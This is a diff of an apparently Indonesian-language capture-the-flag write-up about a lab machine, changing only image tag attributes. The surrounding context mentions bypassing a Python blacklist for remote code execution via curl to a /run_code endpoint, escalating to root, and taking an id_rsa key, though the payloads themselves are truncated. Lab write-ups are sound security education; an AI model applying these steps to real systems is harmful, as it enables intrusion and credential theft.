@@ -8,7 +8,7 @@ excerpt: "Exploit SSTI or PyJail."
 ---
 
 <center>
-<img src="/assets/machine/code/code.jpg" class="img-post" />
+<img src="/assets/machine/code/code.jpg" className="img-post" />
 </center>
 
 # Recon
@@ -35,7 +35,7 @@ Kita bisa lihat kalo ada web dengan port 5000 yang berjalan.
 ## app-production
 
 <center>
-<img src="/assets/machine/code/web_code.jpg" class="img-post" />
+<img src="/assets/machine/code/web_code.jpg" className="img-post" />
 </center>
 
 Di web tersebut kita bisa menjalankan code python yang kita inginkan, namun untuk function yang biasa digunakan untuk RCE kemungkinan besar di blacklist, sehingga kita harus bypass nya.
@@ -72,7 +72,7 @@ curl -X POST http://10.10.11.62:5000/run_code   -H "Content-Type: application/x-
 ```
 
 <center>
-<img src="/assets/machine/code/curl.png" class="img-post" />
+<img src="/assets/machine/code/curl.png" className="img-post" />
 </center>
 
 Sekarang kita lakukan RCE ke target.
@@ -84,7 +84,7 @@ curl -X POST http://10.10.11.62:5000/run_code \
 ```
 
 <center>
-<img src="/assets/machine/code/shell.png" class="img-post" />
+<img src="/assets/machine/code/shell.png" className="img-post" />
 </center>
 
 
@@ -199,7 +199,7 @@ Lalu jalankan.
 Lalu extract backup yang sudah kita buat di folder /tmp
 
 <center>
-<img src="/assets/machine/code/root.jpg" class="img-post" />
+<img src="/assets/machine/code/root.jpg" className="img-post" />
 </center>
 
 Tentu kita juga bisa dapetin **id_rsa** nya.
